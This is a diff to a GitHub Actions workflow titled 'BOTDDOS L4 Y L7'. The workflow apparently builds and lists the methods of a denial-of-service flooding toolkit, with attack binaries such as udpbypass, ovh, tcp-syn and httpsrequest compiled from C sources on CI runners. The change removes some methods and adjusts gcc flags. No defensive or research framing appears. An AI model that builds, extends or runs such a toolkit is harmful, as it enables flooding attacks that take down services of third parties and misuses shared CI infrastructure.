@@ -1,4 +1,4 @@
-name: BOTDDOS L4 Y L7 BEST
+name: BOTDDOSL4YYYYL7
 
 on:
   workflow_dispatch:
@@ -52,13 +52,7 @@ jobs:
             "ovh.c:ovh:-lpcap"
             "udppayload.c:udppayload"
             "udpbypass.c:udpbypass"
-            "tcp.c:tcp"
-            "tcp-ack.c:tcp-ack:-lpcap"
-            "tcp-tls.c:tcp-tls:-lssl -lcrypto"
-            "dns.c:dns"
-            "ntp.c:ntp"
-            "httpsraw.c:httpsraw"
-            "tls.c:tls:-lssl -lcrypto"
+            "tcp.c:tcp" # Corrected compilation command
             "httpsrequest.c:httpsrequest"
             "tcp-syn.c:tcp-syn:-lpthread"  # tcp-syn multi-thread
           )
@@ -75,7 +69,7 @@ jobs:
                   echo "✅"
                 } || echo "⚠️"
               else
-                gcc -O3 -pthread "$source" -o "$binary" 2>/dev/null && {
+                gcc -O3 "$source" -o "$binary" 2>/dev/null && {
                   chmod +x "$binary"
                   echo "✅"
                 } || echo "⚠️"
@@ -135,7 +129,7 @@ jobs:
           echo "🎮 MÉTODOS DISPONIBLES:"
 
           # Mostrar métodos según ejecutables
-          for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn tcp-ack tcp-tls dns ntp httpsraw tls httpsrequest; do
+          for method in udp udphex udppps ovh udppayload udpbypass tcp tcp-syn httpsrequest; do
             [ -f "$method" ] && echo "   • $method"
           done
 
